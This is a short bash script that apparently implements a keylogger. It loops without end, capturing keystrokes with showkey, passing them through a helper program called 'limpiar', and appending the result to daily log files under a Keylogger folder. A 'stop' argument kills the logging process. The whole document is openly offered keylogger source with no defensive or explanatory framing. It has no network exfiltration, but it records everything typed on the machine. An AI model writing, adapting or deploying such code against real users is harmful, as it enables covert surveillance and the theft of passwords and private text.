#!/bin/bash
if [[ $1 == "stop" ]]; then	   	   
	   kill $(ps aux | awk '/[k]eyloger/ {print $2}') #the most elegant way to kill this process!
	   exit #exit the script itself
fi

while true
do
	showkey > /home/moro/Desktop/Keylogger/keyloger.txt
	cp /home/moro/Desktop/Keylogger/keyloger.txt /home/moro/Desktop/Keylogger/keyloger.in
	/home/moro/Desktop/Keylogger/limpiar
	hoy=$(date +"%d_%m_%Y")
	cat /home/moro/Desktop/Keylogger/keyloger.out >> /home/moro/Desktop/Keylogger/reg/$hoy.in
done